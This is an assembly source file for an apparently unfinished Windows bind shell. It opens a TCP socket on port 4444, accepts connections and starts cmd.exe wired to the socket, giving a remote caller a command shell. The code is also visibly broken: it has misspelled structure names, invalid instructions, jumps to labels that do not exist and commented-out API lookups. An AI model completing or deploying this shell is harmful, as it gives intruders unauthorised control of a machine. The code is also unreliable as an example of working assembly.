;
;	BIND REVERSE TCCP
;	API WIN32
;	
[BITS 32]

struc SOCKASSR_IN
	.sin_family	resw	1
	.sin_addr	resd	1
	.sin_port	resw	1
	.sin_zero	resb	8
endstruc

	global _start
; ========================
; DATA
;=========================
section .data
	LoadLibrary:	dw 0x00
	GetProcAddress:	dw 0x00
	
	ssi 		resb 0x44
	spi 		resb 0x10
	sockaddr	resb 0x10
section .bss
section .text
	
	_start:
	push ebp,esp
	sub esp, 0x28	; 10 * 4DWORD
	; str
	; str
	; str
	; str
	; str
	; HANDLE SOCKET
	; HANDLE kernel base
	; 
	; res
	; res
	; RETURN --
	
	WSAStartup:
	
	;
	;	get addr fts
	;mov	edi, eax
	
	xor	eax, eax
	mov 	wss		; WSADATA
	mov	ax, 0x0202	; 
	push	eax		
	call	edi
	test	eax,eax
	js	ret
	
	WSASocket:
	
	;
	;	get addr fts
	;mov	edi, eax
	
	xor	eax, eax
	push	eax
	push	eax
	push	eax
	mov	al, 0x06	; IPPROTO_TCP
	push	eax
	sub	al, 0x05	; SOCK_STREAM
	push	eax
	inc	al
	push	eax		; AF_INET
	call	edi
	test	eax,eax
	js	ret
	
	mov [ esp+0x14 ], eax	; SAVE SOCKET HANDLE ON STACK
	
	GetAdapterInfo:
	
	; try to define addr ipv4 ethernet
	
	; SOCKADDR_IN
	xor	ecx, ecx
	inc	ecx
	inc	ecx
	mov	WORD[ sockaddr + SOCKADDR_IN.sin_family ], cl		; AF_INET
	mov	WORD[ sockaddr + SOCKADDR_IN.sin_port	], 0x5D11	; PORT 4444
	mov 	DWORD[ sockaddr + SOKASDDR_IN.sin_addr  ], 0xFFFFFFFF	; BROADCAST
	
	
	
	bind:
	
	;
	;	get addr fts
	;mov	edi, eax
	
	xor	ebx, ebx
	mov	edx, [esp+0x14]	
	mov 	ecx, 0x10		; len
	push	ecx
	mov	ebx, sockaddr		; sockaddr *
	push	ebx			; 
	push	edx			; HANDLE socket
	call	edi
	test	eax, eax
	js	ret
	
	
	listen:
	
	;
	;	get addr fts
	;mov	edi, eax
	
	xor	ebx, ebx
	inc 	ebx
	push	ebx
	mov	edx, [esp+0x14]
	push	edx
	call	edi
	test	eax, eax
	js
	
	;
	;	get addr accept fct
	;mov	[esp+0x24], eax
	
	infinteloop:
	
		accept:
		xor 	eax, eax
		push	eax
		push	eax
		mov	edx, [esp+0x14]	; SOCKET
		push	edx
		mov	edi, [esp+0x20]	; HANDLE accept addr
		call	edi
		
		test	eax, eax
		js	noclient
		
		; STARTUP_INFO
		xor 	ecx,ecx
		mov 	edx, [esp+0x14]
		mov 	ac,0x01
		inc 	ecx
		mov DWORD[ ssi + STARTUPINFO.dwFlags ], ecx
		mov DWORD[ ssi + STARTUPINFO.hStdInput ], edx
		mov DWORD[ ssi + STARTUPINFO.hStdOutput ], edx
		mov DWORD[ ssi + STARTUPINFO.hStdError ], edx
		
		CreateProcess:
		;
		;	get addr fts
		;mov	edi, eax
		
		xor	ebx, ebx
		push	spi	; PROCESS_INFORMATION
		push	ssi	; STARTUP_INFO
		push	ebx
		push	ebx
		push	ebx
		inc	ebx
		push	ebx	; true
		dec	ebx
		push	ebx
		push	ebx	
		mov	edx, cmd ; cmd.exe
		push	edx
		push	ebx
		call	edi
		
		xor	ebx, ebx
		cmp	eax,ebx
		je	no
		
		; WaitForSingleObject
		; closeHandle
		; closeHandle
		
		no:
		noclient:
		Sleep:
		
		;
		;	get addr fts
		;mov	edi, eax
		
		mov	ecx, 0xC8	; 200 Milliseconds
		push	ecx
		call	edi
		
	jmp	loop
	
	ret:
		WSACleanup:
		;....
		;...
		close:
		;...
		;...
		
		
	leave
	
	cmd:	db "cmd.exe",0
